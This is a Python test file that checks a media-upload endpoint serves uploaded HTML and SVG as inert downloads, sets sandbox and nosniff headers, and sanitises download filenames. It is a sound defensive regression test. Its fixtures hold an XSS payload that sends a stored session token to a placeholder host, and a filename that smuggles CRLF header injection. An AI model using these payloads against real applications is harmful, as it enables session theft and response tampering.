"""Security: uploaded media must never be served in a form the browser can execute.

Regression for the audit finding where /api/media echoed the uploader-chosen MIME type, so an
employee could upload HTML/SVG with script that ran as the app (stealing the session token)
when a colleague opened the attachment.
"""
import base64

import pytest

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16
PDF = b"%PDF-1.7\n%stuff"
HTML = b"<html><script>fetch('//x/'+localStorage.ros_tok)</script></html>"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'


async def _upload(client, tenant, raw, mime=None, name="f", data_url_mime=None):
    b64 = base64.b64encode(raw).decode()
    data = f"data:{data_url_mime};base64,{b64}" if data_url_mime else b64
    body = {"data": data, "name": name}
    if mime:
        body["mime"] = mime
    r = await client.post("/api/media", headers=tenant, json=body)
    assert r.status_code == 201, r.text
    return await client.get(r.json()["url"], headers=tenant)


@pytest.mark.asyncio
@pytest.mark.parametrize("raw, kw", [
    (HTML, {"mime": "text/html"}),
    (SVG, {"mime": "image/svg+xml"}),
    (HTML, {"data_url_mime": "text/html"}),          # type smuggled in the data: URL
    (HTML, {"mime": "application/xhtml+xml"}),
    (HTML, {"mime": "image/png"}),                    # lies about its type: bytes aren't PNG
    (HTML, {}),                                       # no type at all
])
async def test_active_content_is_served_as_inert_download(client, tenant, raw, kw):
    r = await _upload(client, tenant, raw, name="evil.html", **kw)
    assert r.status_code == 200
    assert r.headers["content-type"] == "application/octet-stream"
    assert r.headers["content-disposition"].startswith("attachment")
    assert "sandbox" in r.headers["content-security-policy"]
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.content == raw            # bytes untouched — just not executable


@pytest.mark.asyncio
async def test_real_images_still_display_inline_sandboxed(client, tenant):
    r = await _upload(client, tenant, PNG, mime="image/png", name="photo.png")
    assert r.headers["content-type"] == "image/png"
    assert "content-disposition" not in r.headers
    assert "sandbox" in r.headers["content-security-policy"]


@pytest.mark.asyncio
async def test_pdfs_open_inline(client, tenant):
    r = await _upload(client, tenant, PDF, mime="application/pdf", name="invoice.pdf")
    assert r.headers["content-type"] == "application/pdf"
    assert "content-disposition" not in r.headers


@pytest.mark.asyncio
async def test_download_filename_cannot_inject_headers(client, tenant):
    r = await _upload(client, tenant, HTML, mime="text/html", name='a"\r\nSet-Cookie: x=1;/../b.html')
    cd = r.headers["content-disposition"]
    assert "\r" not in cd and "\n" not in cd and '"' not in cd and "/" not in cd.split("''", 1)[1]
    assert "set-cookie" not in {k.lower() for k in r.headers if k.lower() != "content-disposition"}
